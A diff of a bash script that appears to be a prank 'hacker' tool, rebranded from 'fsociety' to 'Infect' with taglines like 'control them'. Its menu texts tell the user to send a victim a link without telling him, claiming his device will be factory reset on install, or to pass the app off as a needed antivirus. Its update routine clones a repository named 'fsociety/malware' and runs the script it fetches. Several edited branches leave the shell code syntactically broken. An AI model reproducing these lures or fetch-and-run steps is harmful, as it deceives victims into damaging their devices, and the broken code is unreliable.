@@ -1,4 +1,4 @@
-# A tool by nitro from fsociety
+# A tool by nitro from Fuck society
 # Colours
 #-----------------
 red="\e[91m"
@@ -26,7 +26,7 @@ echo -e '\e[93m
 X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
 X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
 echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
- X# \.X        @#%,.@   fsociety v2.1      @#%,.@        
+ X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                 @#%,.@              @#%,.@          
                   @#%,.@          @#%,.@            
                      @#%,.@      @#%,.@             
@@ -35,10 +35,10 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 '
 echo " " 
 echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
-echo -e "$red                      ⫸$ylo  fsociety$red ⫷$rset"
+echo -e "$red                      ⫸$ylo  fuck society$red ⫷$rset"
 echo 
 # Functions
-echo -e "$red                    [Infect them with fun]$rset"
+echo -e "$red                    [control them]$rset"
 echo " "
 echo " "
 }
@@ -66,11 +66,11 @@ echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
                         Noob Hackers
 '
 echo " " 
-echo -e "$red                       ▶Coded by$grn YourAnonElliot$red◀$rset"
-echo -e "$red                      ⫸$ylo  fsociety Hackers$red ⫷$rset"
+echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
+echo -e "$red                      ⫸$ylo  fucksociety$red ⫷$rset"
 echo 
 # Functions
-echo -e "$red                    [Infect them ]$rset"
+echo -e "$red                    [control them$rset"
 echo " "
 echo " "
 }
@@ -101,17 +101,8 @@ then
 about
 elif [ $optnz = "4" ];
 then
-upd
-elif [ $optnz = "5" ];
-banner
 menu
 elif [ $optnz = "6" ];
-banner
-menu
-elif [ $optnz = "7" ];
-banner
-menu
-elif [ $optnz = "8" ];
 then
 exit 1
 else
@@ -134,7 +125,7 @@ say nothing to him. when he install it in his
 device it will be factory reset and lot more happens.
                                 👇👇👇
 
-         \e[92mL1NK :- \e[96mhttps://www.avira.com/en/blog/fsociety-ransomware[93m
+         \e[92mL1NK :- \e[96mhttps://www.ncell.axiata.com/en/individual/ncellapp[91m
 
                                  👆👆👆
 Use only for fun purpose not for harming someone 😇✌️.
@@ -167,7 +158,7 @@ that he should install this application or else his
 device will not be recovered.(Antivirus)
                     👇👇👇
 
-        \e[92mL1NK :- \e[96mhttps://www.avira.com/en/blog/fsociety-ransomware[93m
+        \e[92mL1NK :- \e[96mhttps://www.ncell.axiata.com/en/individual/ncellapp[93m
 
                     👆👆👆
 Use only for fun purpose not for harming someone 😇✌️. 
@@ -197,6 +188,8 @@ echo -e '\e[91m
          ─▐─█────█─▌─
          ────▌──▐────
 '
+sleep 6.0
+banner
 menu
 }
 upd(){
@@ -218,7 +211,7 @@ echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
 # While process is running...
-while git clone https://github.com/mr.robot/fsociety 2> /dev/null; do 
+while git clone https://github.com/fsociety/malware 2> /dev/null; do 
     printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
@@ -229,27 +222,24 @@ echo
 printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
 sleep 2.0
 cd $HOME
-cd fsociety
+cd malware
 bash fsociety.sh
 }
 vid(){
-FILE=$HOME/fsociety/elliot.mr.robot
+FILE=$HOME/fsociety/malware.fsociety
 if [ -f "$FILE" ]; then
 pop
 else
 echo
 fi
 }
-menu
-elif [ "$p" = "t" ];
-then
 clear
 baner1
 menu
 elif [ "$p" = "z" ];
 then
 cd $HOM/fsociety
-rm mr.robot.fsociety
+rm fsociety
 banner
 menu
 else
